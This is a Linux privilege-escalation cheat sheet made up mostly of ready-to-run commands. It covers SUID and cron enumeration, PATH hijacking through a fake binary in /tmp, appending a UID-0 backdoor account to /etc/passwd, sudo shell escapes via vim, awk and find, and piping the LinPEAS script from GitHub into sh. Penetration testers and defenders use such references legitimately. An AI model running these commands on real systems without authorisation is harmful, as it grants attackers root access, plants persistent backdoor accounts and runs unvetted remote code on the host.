---
title: Linux Privilege Escalation Cheatsheet
slug: linux-privesc
date: 2026-08-14
updated: 2026-08-19
tags: [linux, privilege-escalation, enumeration, scanning, recon]
description: Common techniques and commands for escalating privileges on Linux systems
---

## Manual Enumeration

```bash
# Current user info
whoami
id

# Sudo privileges
sudo -l

# SUID binaries
find / -perm -4000 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/

# Running processes
ps aux

# Network connections
ss -tulpn
netstat -tulpn
```

## Common Exploits

### SUID Binary Abuse

```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check GTFOBins for exploits
curl https://gtfobins.github.io/
```

### PATH Hijacking

```bash
# Check PATH
echo $PATH

# If current directory is in PATH or script uses relative paths:
export PATH=/tmp:$PATH
echo '/bin/bash' > /tmp/vulnerable_binary
chmod +x /tmp/vulnerable_binary
```

### Writable /etc/passwd

```bash
# Generate password hash
openssl passwd -1 -salt hacker hacker

# Add to /etc/passwd
echo 'hacker:$1$hacker$zV9QJ7YrIZu6xB0GwG3fD1:0:0::/root:/bin/bash' >> /etc/passwd
su hacker
```

### Sudo Exploits

```bash
# List sudo privileges
sudo -l

# Common sudo exploits (check GTFOBins)
sudo vim -c ':!/bin/sh'
sudo less /etc/hosts
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh \; -quit
```

## Automated Tools

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh

# Linux Smart Enumeration
./lse.sh
```
